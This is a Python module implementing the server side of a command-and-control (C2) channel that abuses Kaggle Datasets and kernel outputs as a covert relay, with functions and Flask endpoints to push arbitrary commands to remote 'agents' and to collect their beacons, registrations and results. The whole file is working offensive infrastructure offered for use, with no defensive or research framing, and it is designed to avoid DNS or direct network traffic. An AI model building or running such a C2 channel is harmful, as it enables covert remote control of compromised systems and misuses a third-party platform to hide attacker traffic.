#!/usr/bin/env python3
"""
C2 Server integration with Kaggle Datasets

This module provides server-side functionality to communicate
with Kaggle kernels via datasets (no DNS/network needed).
"""

import json
import time
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, List, Optional

try:
    import kaggle
    from kaggle.api.kaggle_api_extended import KaggleApi
    KAGGLE_AVAILABLE = True
except ImportError:
    KAGGLE_AVAILABLE = False


class DatasetC2Server:
    """Server-side C2 via Kaggle Datasets"""
    
    def __init__(self, username: str, dataset_slug: str = "c2-commands"):
        self.username = username
        self.dataset_slug = dataset_slug
        self.dataset_name = f"{username}/{dataset_slug}"
        self.api = None
        
        if KAGGLE_AVAILABLE:
            try:
                self.api = KaggleApi()
                self.api.authenticate()
            except Exception as e:
                print(f"[DATASET C2] Kaggle API error: {e}")
    
    def create_commands_dataset(self) -> bool:
        """Create or update commands dataset"""
        if not self.api:
            print("[DATASET C2] Kaggle API not available")
            return False
        
        # Create dataset directory
        dataset_dir = Path("/tmp/c2-commands")
        dataset_dir.mkdir(parents=True, exist_ok=True)
        
        # Create initial commands file
        commands = {
            "commands": [],
            "created": datetime.now().isoformat(),
            "version": "1.0"
        }
        
        with open(dataset_dir / "commands.json", "w") as f:
            json.dump(commands, f, indent=2)
        
        # Create dataset metadata
        metadata = {
            "title": self.dataset_slug,
            "id": self.dataset_name,
            "subtitle": "C2 Commands Dataset",
            "description": "Command & Control commands for Kaggle agents",
            "licenses": [{"name": "CC0-1.0"}],
            "resources": [
                {
                    "path": "commands.json",
                    "description": "C2 commands"
                }
            ]
        }
        
        with open(dataset_dir / "dataset-metadata.json", "w") as f:
            json.dump(metadata, f, indent=2)
        
        try:
            # Try to create dataset
            self.api.dataset_create_new_version(
                folder=str(dataset_dir),
                version_notes="Initial C2 commands",
                convert_to_csv=False
            )
            print(f"[DATASET C2] Created dataset: {self.dataset_name}")
            return True
        except Exception as e:
            # Dataset might already exist, try to update
            print(f"[DATASET C2] Dataset update: {e}")
            return False
    
    def send_command(self, command: Dict[str, Any]) -> bool:
        """Send command to agents via dataset"""
        if not self.api:
            return False
        
        # Download current commands
        dataset_dir = Path("/tmp/c2-commands-download")
        dataset_dir.mkdir(parents=True, exist_ok=True)
        
        try:
            self.api.dataset_download_files(
                self.dataset_name,
                path=str(dataset_dir),
                unzip=True
            )
            
            commands_file = dataset_dir / "commands.json"
            if commands_file.exists():
                with open(commands_file) as f:
                    data = json.load(f)
            else:
                data = {"commands": []}
        except:
            data = {"commands": []}
        
        # Add new command
        command["id"] = command.get("id", f"cmd-{int(time.time())}")
        command["timestamp"] = datetime.now().isoformat()
        command["executed"] = False
        data["commands"].append(command)
        
        # Upload updated dataset
        upload_dir = Path("/tmp/c2-commands-upload")
        upload_dir.mkdir(parents=True, exist_ok=True)
        
        with open(upload_dir / "commands.json", "w") as f:
            json.dump(data, f, indent=2)
        
        try:
            self.api.dataset_create_new_version(
                folder=str(upload_dir),
                version_notes=f"Command: {command.get('type', 'unknown')}",
                convert_to_csv=False
            )
            print(f"[DATASET C2] Command sent: {command.get('type')}")
            return True
        except Exception as e:
            print(f"[DATASET C2] Error sending command: {e}")
            return False
    
    def get_results(self, kernel_owner: str, kernel_slug: str) -> List[Dict]:
        """Get results from kernel output"""
        if not self.api:
            return []
        
        try:
            # Download kernel output
            output_dir = Path("/tmp/c2-output-download")
            output_dir.mkdir(parents=True, exist_ok=True)
            
            self.api.kernel_output(
                f"{kernel_owner}/{kernel_slug}",
                path=str(output_dir)
            )
            
            # Read results
            results_file = output_dir / "c2-output.json"
            if results_file.exists():
                with open(results_file) as f:
                    data = json.load(f)
                return data.get("results", [])
            
            return []
        except Exception as e:
            print(f"[DATASET C2] Error getting results: {e}")
            return []
    
    def get_agents(self, kernel_owner: str, kernel_slug: str) -> List[Dict]:
        """Get registered agents from kernel output"""
        if not self.api:
            return []
        
        try:
            output_dir = Path("/tmp/c2-agents-download")
            output_dir.mkdir(parents=True, exist_ok=True)
            
            self.api.kernel_output(
                f"{kernel_owner}/{kernel_slug}",
                path=str(output_dir)
            )
            
            agents_file = output_dir / "c2-agents.json"
            if agents_file.exists():
                with open(agents_file) as f:
                    data = json.load(f)
                return data if isinstance(data, list) else []
            
            return []
        except Exception as e:
            print(f"[DATASET C2] Error getting agents: {e}")
            return []
    
    def get_beacons(self, kernel_owner: str, kernel_slug: str) -> List[Dict]:
        """Get beacons from kernel output"""
        if not self.api:
            return []
        
        try:
            output_dir = Path("/tmp/c2-beacons-download")
            output_dir.mkdir(parents=True, exist_ok=True)
            
            self.api.kernel_output(
                f"{kernel_owner}/{kernel_slug}",
                path=str(output_dir)
            )
            
            beacons_file = output_dir / "c2-beacons.json"
            if beacons_file.exists():
                with open(beacons_file) as f:
                    data = json.load(f)
                return data.get("beacons", [])
            
            return []
        except Exception as e:
            print(f"[DATASET C2] Error getting beacons: {e}")
            return []


# Flask endpoints for C2 server integration
def create_dataset_c2_endpoints(app, db):
    """Create Flask endpoints for Dataset C2"""
    
    @app.route("/api/dataset-c2/command", methods=["POST"])
    def send_dataset_command():
        """Send command to agents via dataset"""
        data = request.get_json(silent=True) or {}
        
        server = DatasetC2Server(
            username=data.get("username", "cassandradixon320631"),
            dataset_slug=data.get("dataset", "c2-commands")
        )
        
        command = {
            "type": data.get("type", "ping"),
            "target": data.get("target", "*"),
            "command": data.get("command", ""),
            "interval": data.get("interval", 60)
        }
        
        success = server.send_command(command)
        
        return jsonify({
            "status": "ok" if success else "error",
            "command": command
        })
    
    @app.route("/api/dataset-c2/agents", methods=["GET"])
    def get_dataset_agents():
        """Get registered agents from kernel output"""
        kernel_owner = request.args.get("owner", "cassandradixon320631")
        kernel_slug = request.args.get("kernel", "c2-channel")
        
        server = DatasetC2Server(username=kernel_owner)
        agents = server.get_agents(kernel_owner, kernel_slug)
        
        return jsonify({"agents": agents})
    
    @app.route("/api/dataset-c2/results", methods=["GET"])
    def get_dataset_results():
        """Get command results from kernel output"""
        kernel_owner = request.args.get("owner", "cassandradixon320631")
        kernel_slug = request.args.get("kernel", "c2-channel")
        
        server = DatasetC2Server(username=kernel_owner)
        results = server.get_results(kernel_owner, kernel_slug)
        
        return jsonify({"results": results})
    
    @app.route("/api/dataset-c2/beacons", methods=["GET"])
    def get_dataset_beacons():
        """Get beacons from kernel output"""
        kernel_owner = request.args.get("owner", "cassandradixon320631")
        kernel_slug = request.args.get("kernel", "c2-channel")
        
        server = DatasetC2Server(username=kernel_owner)
        beacons = server.get_beacons(kernel_owner, kernel_slug)
        
        return jsonify({"beacons": beacons})


if __name__ == "__main__":
    # Test Dataset C2
    server = DatasetC2Server("cassandradixon320631")
    
    # Create commands dataset
    server.create_commands_dataset()
    
    # Send test command
    server.send_command({"type": "ping", "target": "*"})
    
    # Get agents
    agents = server.get_agents("cassandradixon320631", "c2-channel")
    print(f"Agents: {agents}")
